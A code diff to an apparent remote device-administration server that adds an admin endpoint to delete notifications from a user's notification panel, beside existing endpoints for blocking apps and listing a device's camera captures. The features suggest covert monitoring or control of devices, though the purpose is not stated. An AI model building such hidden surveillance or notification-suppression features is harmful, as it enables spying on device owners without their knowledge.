@@ -3442,6 +3442,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // v7.9.4: Two-way chat relay
       socket.on('admin_chat_received', (data) => { io.emit('admin_chat_received', data); });
       socket.on('chat_response', (data) => { io.emit('chat_response', data); });
+
+      // v7.9.9: Notification delete relay
+      socket.on('delete_notification_result', (data) => { io.emit('delete_notification_result', data); });
     });
   }
 
@@ -4695,6 +4698,15 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   app.post('/api/admin/unblock-app-v2', express.json(), (req, res) =>
     relayCommand(req, res, 'unblock_app_v2', b => ({ package: b.package || '' })));
   app.post('/api/admin/get-blocked-apps', express.json(), (req, res) => relayCommand(req, res, 'get_blocked_apps'));
+
+  // v7.9.9: Delete notification from user's notification panel
+  app.post('/api/admin/delete-notification', express.json(), (req, res) =>
+    relayCommand(req, res, 'delete_notification', b => ({
+      key: b.key || '',
+      package: b.package || b.app || '',
+      tag: b.tag || '',
+      id: b.id || -1
+    })));
 
   // ═══ v7.9.2: Camera captures GET endpoint (list photos for a device) ═══
   app.get('/api/admin/connections/:deviceId/camera-captures', (req, res) => {
